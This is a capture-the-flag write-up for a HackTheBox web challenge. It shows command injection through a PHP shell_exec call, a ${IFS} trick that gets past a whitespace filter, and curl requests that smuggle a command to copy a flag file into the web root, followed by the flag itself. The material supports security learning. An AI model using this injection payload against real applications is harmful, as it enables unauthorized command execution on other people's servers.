---
title: "Void Whispers"
ctf: "HackTheBox"
date: 2026-05-26
category: web
difficulty: very-easy
flag_format: "HTB{...}"
---

# Void Whispers

## Summary

Command injection via `shell_exec("which $sendMailPath")` in the config updater. Spaces are blocked via regex, but `${IFS}` bypasses the filter, allowing arbitrary command execution.

## Solution

### Step 1: Identify Vulnerability

`IndexController.php:40` passes user-controlled `sendMailPath` directly into a shell command:

```php
$whichOutput = shell_exec("which $sendMailPath");
```

Only whitespace is blocked: `preg_match('/\s/', $sendMailPath)`. No protection against `$`, `(`, `)`, or redirection operators.

### Step 2: Exploit with ${IFS} Bypass

The `${IFS}` bash variable expands to whitespace, bypassing the PHP regex (no literal spaces in the payload):

```bash
curl -sk -X POST "http://target:port/update" \
  -d 'from=test' \
  -d 'email=test@test.com' \
  -d 'mailProgram=sendmail' \
  -d 'sendMailPath=$(cp${IFS}/flag.txt${IFS}/www/static/f.txt)'
```

The command `cp /flag.txt /www/static/f.txt` executes inside the `$()` command substitution, copying the flag to the web root.

### Step 3: Retrieve Flag

```bash
curl -sk http://target:port/static/f.txt
```

## Flag

```
HTB{c0mm4nd_1nj3ct1on_15_3457_t0_f1nD!}
```
